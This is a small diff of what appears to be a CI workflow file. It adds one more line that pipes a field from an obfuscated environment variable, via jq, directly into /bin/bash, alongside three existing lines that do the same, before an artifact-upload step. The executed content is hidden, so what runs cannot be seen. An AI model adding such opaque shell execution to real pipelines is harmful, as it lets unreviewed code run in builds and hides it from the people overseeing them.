@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$fca38" | jq -r .kbdrt5959 | /bin/bash
           echo $dsw3 | jq -r .qp38 | /bin/bash
           echo $n377 | jq -r .kyl9 | /bin/bash
+          echo $xw9850 | jq -r .bvdil33 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
